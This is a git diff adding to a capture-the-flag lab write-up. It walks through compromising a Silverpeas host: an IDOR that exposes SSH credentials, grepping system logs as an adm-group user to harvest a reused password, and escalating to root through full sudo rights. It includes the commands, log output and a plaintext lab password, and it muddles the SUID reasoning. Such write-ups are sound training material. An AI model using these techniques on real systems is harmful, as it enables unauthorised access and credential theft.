@@ -88,6 +88,7 @@ I performed directory enumeration but It didn't give me anything. I didn't know 
 http://<IP>:8080/silverpeas
 ```
 
+### Initial Access
 I received back a login page `http://<IP>:8080/silverpeas/defaultLogin.jsp`. 
 ![[login-page.png]]
 
@@ -122,4 +123,87 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-08-26 17:36:
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-08-26 17:36:34
 ```
 
-I logged in using the credentials and landed in `scr1ptkiddy` home page. I could not find anything much, so I googled for an exploit and found a website explaining the `Authentication Bypass` with the `CVE-2024-36042`. 
+I logged in using the credentials and landed in `scr1ptkiddy` home page. I started looking around the website and under **Personal workspace** there's **My notifications** tab. There's a notification inside, and when I opened it I was redirected to another link with an `ID=5`.
+![[notification.png]]
+
+This reminded of the `Insecure Direct Object Reference (IDOR)` attack. I could not change the ID there, so I copied the link and started changing from 0 and found ssh login details at`ID=6`.
+![[ssh_login_creds.png]]
+
+#### First Flag
+```bash
+ssh tim@<IP>
+cat user.txt
+```
+
+### Privilege Escalation
+I checked the group and found that the user `tim` is a part of `adm` group.
+```bash
+id
+
+groups
+tim adm
+```
+
+I searched online for the `adm` group and found out that it is a ***default system group*** and ***can read system logs***, usually in `/var/log.`
+
+#### Read Logs
+```bash
+grep -ri 'password' /var/log/* 2>/dev/null
+/var/log/auth.log:Aug 27 17:42:22 ip-10-10-132-84 sshd[2306]: Accepted password for tim from 10.14.101.2 port 47108 ssh2
+/var/log/auth.log.1:Jul 21 20:10:26 ip-10-10-119-245 passwd[654]: password for 'ubuntu' changed by 'root'
+/var/log/auth.log.1:Aug 27 17:38:02 ip-10-10-132-84 passwd[644]: password for 'ubuntu' changed by 'root'
+/var/log/auth.log.2:Dec 12 19:34:46 silver-platter passwd[1576]: pam_unix(passwd:chauthtok): password changed for tim
+/var/log/auth.log.2:Dec 12 19:39:15 silver-platter sudo:    tyler : 3 incorrect password attempts ; TTY=tty1 ; PWD=/home/tyler ; USER=root ; COMMAND=/usr/bin/apt install nginx
+/var/log/auth.log.2:Dec 13 15:39:07 silver-platter usermod[1597]: change user 'dnsmasq' password
+/var/log/auth.log.2:Dec 13 15:39:07 silver-platter chage[1604]: changed password expiry for dnsmasq
+/var/log/auth.log.2:Dec 13 15:40:33 silver-platter sudo:    tyler : TTY=tty1 ; PWD=/ ; USER=root ; COMMAND=/usr/bin/docker run --name postgresql -d -e POSTGRES_PASSWORD=_Zd_zx7N823/ -v postgresql-data:/var/lib/postgresql/data postgres:12.3
+/var/log/auth.log.2:Dec 13 15:44:30 silver-platter sudo:    tyler : TTY=tty1 ; PWD=/ ; USER=root ; COMMAND=/usr/bin/docker run --name silverpeas -p 8080:8000 -d -e DB_NAME=Silverpeas -e DB_USER=silverpeas -e DB_PASSWORD=_Zd_zx7N823/ -v silverpeas-log:/opt/silverpeas/log -v silverpeas-data:/opt/silvepeas/data --link postgresql:database sivlerpeas:silverpeas-6.3.1
+/var/log/auth.log.2:Dec 13 15:45:21 silver-platter sudo:    tyler : TTY=tty1 ; PWD=/ ; USER=root ; COMMAND=/usr/bin/docker run --name silverpeas -p 8080:8000 -d -e DB_NAME=Silverpeas -e DB_USER=silverpeas -e DB_PASSWORD=_Zd_zx7N823/ -v silverpeas-log:/opt/silverpeas/log -v silverpeas-data:/opt/silvepeas/data --link postgresql:database silverpeas:silverpeas-6.3.1
+/var/log/auth.log.2:Dec 13 15:45:57 silver-platter sudo:    tyler : TTY=tty1 ; PWD=/ ; USER=root ; COMMAND=/usr/bin/docker run --name silverpeas -p 8080:8000 -d -e DB_NAME=Silverpeas -e DB_USER=silverpeas -e DB_PASSWORD=_Zd_zx7N823/ -v silverpeas-log:/opt/silverpeas/log -v silverpeas-data:/opt/silvepeas/data --link postgresql:database silverpeas:6.3.1
+```
+
+We can see the password `_Zd_zx7N823/` and tried this against the `tyler` user.
+
+```bash
+su tyler
+```
+
+**Checked if the User is in the Sudoers list**
+```bash
+sudo -l
+[sudo] password for tyler: 
+Matching Defaults entries for tyler on ip-10-10-132-84:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User tyler may run the following commands on ip-10-10-132-84:
+    (ALL : ALL) ALL
+```
+
+The user `tyler` is in `sudoers` list and perform all commands as root.
+
+**Checked SUID**
+```bash
+find / -perm -4000 2>/dev/null
+/usr/lib/openssh/ssh-keysign
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/snapd/snap-confine
+/usr/bin/chsh
+/usr/bin/newgrp
+/usr/bin/fusermount3
+/usr/bin/passwd
+/usr/bin/mount
+/usr/bin/gpasswd
+/usr/bin/sudo
+/usr/bin/su
+/usr/bin/chfn
+/usr/bin/pkexec
+/usr/bin/umount
+/usr/libexec/polkit-agent-helper-1
+```
+
+`su` has SUID bit enabled, so we can use this to escalate to root.
+
+```bash
+sudo su 
+cat root.txt
+```
